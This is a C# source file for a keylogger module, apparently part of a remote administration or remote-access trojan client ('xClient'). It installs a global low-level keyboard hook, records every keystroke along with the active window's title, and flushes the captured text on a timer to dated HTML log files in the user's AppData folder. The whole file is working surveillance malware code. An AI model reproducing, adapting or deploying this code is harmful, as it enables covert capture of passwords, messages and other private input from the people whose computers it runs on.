using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace xClient.Core.Keylogger
{
    public class Logger
    {
        public static Logger Instance;

        private bool IsEnabled = false;
        public bool Enabled
        {
            get { return this.IsEnabled; }
            set { SetHook(value); }
        }

        private StringBuilder _logFileBuffer;
        private string _hWndTitle;
        private string _hWndLastTitle;

        private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                            "\\Logs\\";

        private LoggedKey keyToLog;
        private readonly List<LoggedKey> _keysDown = new List<LoggedKey>();
        private readonly System.Timers.Timer _timerFlush;

        public struct KeyData
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        private const int WM_KEYDOWN = 0x100;
        private const int WM_KEYUP = 0x101;
        private const int WM_SYSKEYDOWN = 0x104;
        private const int WM_SYSKEYUP = 0x105;
        private const int WH_KEYBOARD_LL = 13;

        public delegate int HookProcDelegate(int nCode, int wParam, ref KeyData lParam);
        private HookProcDelegate _hook;

        private IntPtr _hookHandle = IntPtr.Zero;

        /// <summary>
        /// Creates the logging class that provides keylogging functionality.
        /// </summary>
        public Logger(double flushInterval)
        {
            Instance = this;
            _hWndLastTitle = string.Empty;

            WriteFile();

            this._timerFlush = new System.Timers.Timer { Enabled = false, Interval = flushInterval };
            this._timerFlush.Elapsed += this.timerFlush_Elapsed;

            this._logFileBuffer = new StringBuilder();
        }

        private string HighlightSpecialKey(string name)
        {
            if (!string.IsNullOrEmpty(name))
            {
                return string.Format("<font color=\"0000FF\">[{0}]</font>", name);
            }
            else
            {
                return string.Empty;
            }
        }

        private int HookProc(int nCode, int wParam, ref KeyData lParam)
        {
            if (nCode >= 0)
            {
                switch (wParam)
                {
                    case WM_KEYDOWN:
                    case WM_SYSKEYDOWN:
                        //TODO - handle modifier keys in a better way
                        //
                        // If a user presses only the control key and then decides to press a, so the combination would be ctrl + a, it will log [CTRL][CTRL + a]
                        // perhaps some sort of filter?
                        keyToLog = new LoggedKey();
                        keyToLog.PressedKey = (KeyloggerKeys)lParam.vkCode;

                        if (!_keysDown.Contains(keyToLog))
                        {
                            try
                            {
                                _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
                                if (!string.IsNullOrEmpty(_hWndTitle))
                                {
                                    // Only write the title to the log file if the names are different.
                                    if (_hWndTitle != _hWndLastTitle)
                                    {
                                        _hWndLastTitle = _hWndTitle;
                                        _logFileBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
                                    }
                                }

                                if (keyToLog.ModifierKeysSet)
                                {
                                    if (keyToLog.PressedKey.IsSpecialKey())
                                    {
                                        // The returned string could be empty. If it is, ignore it
                                        // because we don't know how to handle that special key.
                                        // The key would be considered unsupported.
                                        string pressedKey = keyToLog.PressedKey.GetKeyloggerKeyName();

                                        if (!string.IsNullOrEmpty(pressedKey))
                                        {
                                            _logFileBuffer.Append(HighlightSpecialKey(pressedKey));
                                        }
                                    }
                                    else
                                    {
                                        // The pressed key is not special, but we have encountered
                                        // a situation of multiple key presses, so just build them.
                                        _logFileBuffer.Append(HighlightSpecialKey(keyToLog.ModifierKeys.BuildString() +
                                                              FromKeys(keyToLog)));
                                    }
                                }
                                else
                                {
                                    if (keyToLog.PressedKey.IsSpecialKey())
                                    {
                                        string pressedKey = keyToLog.PressedKey.GetKeyloggerKeyName();

                                        if (!string.IsNullOrEmpty(pressedKey))
                                        {
                                            _logFileBuffer.Append(HighlightSpecialKey(pressedKey));
                                        }
                                    }
                                    else
                                    {
                                        _logFileBuffer.Append(FromKeys(keyToLog));
                                    }
                                }
                            }
                            catch
                            {
                            }

                            _keysDown.Add(keyToLog); //avoid multiple keypress holding down a key
                        }
                        break;
                    case WM_KEYUP:
                    case WM_SYSKEYUP:
                        _keysDown.RemoveAll(k => k == keyToLog); //remove 'keydown' key after up message
                        break;
                }
            }

            return Win32.CallNextHookEx(_hookHandle, nCode, wParam, ref lParam);
        }

        private void SetHook(bool enable)
        {
            switch (enable)
            {
                case true:
                    _hook = new HookProcDelegate(HookProc);
                    _hookHandle = Win32.SetWindowsHookEx(WH_KEYBOARD_LL, _hook, Win32.GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
                    //hook installed, enabled
                    _timerFlush.Enabled = true;
                    IsEnabled = true;
                    Application.Run(); //start message pump for our hook on this thread
                    break;
                case false:
                    _timerFlush.Enabled = false;
                    if (_hookHandle != IntPtr.Zero)
                        Win32.UnhookWindowsHookEx(_hookHandle);
                    Application.ExitThread(); //Bug: Thread doesn't exit, message pump still running, disconnecting client will hang in memory
                    break;
            }
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = _filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(_filePath))
                    Directory.CreateDirectory(_filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                            {
                                sw.Write("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                         DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");

                                if (_logFileBuffer.Length > 0)
                                    sw.Write(_logFileBuffer);

                                _hWndLastTitle = string.Empty;
                            }
                            else
                                sw.Write(_logFileBuffer);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }

            _logFileBuffer = new StringBuilder();
        }

        private string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            Win32.GetWindowText(Win32.GetForegroundWindow().ToInt32(), sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();

            return title != string.Empty ? title : null;
        }

        private IntPtr GetActiveKeyboardLayout()
        {
            uint pid;
            //Get the appropriate unicode character from the state of keyboard and from the Keyboard layout (language) of the active thread
            return Win32.GetKeyboardLayout(Win32.GetWindowThreadProcessId(Win32.GetForegroundWindow(), out pid));
        }

        private char? FromKeys(LoggedKey key)
        {
            //keyStates is a byte array that specifies the current state of the keyboard and keys
            //The keys we are interested in are modifier keys such as shift and caps lock
            byte[] keyStates = new byte[256];

            if (key.ModifierKeys.ShiftKeyPressed)
                keyStates[(int)KeyloggerKeys.VK_SHIFT] = 0x80;

            if (key.ModifierKeys.CapsLock)
                keyStates[(int)KeyloggerKeys.VK_CAPITAL] = 0x01;

            if (key.ModifierKeys.NumLock)
                keyStates[(int)KeyloggerKeys.VK_NUMLOCK] = 0x01;

            if (key.ModifierKeys.ScrollLock)
                keyStates[(int)KeyloggerKeys.VK_SCROLL] = 0x01;

            var sb = new StringBuilder(10);

            return Win32.ToUnicodeEx(key.PressedKey.GetKeyloggerKeyValue(), 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1
                                     ? (char?)sb[0] : null;
        }
    }
}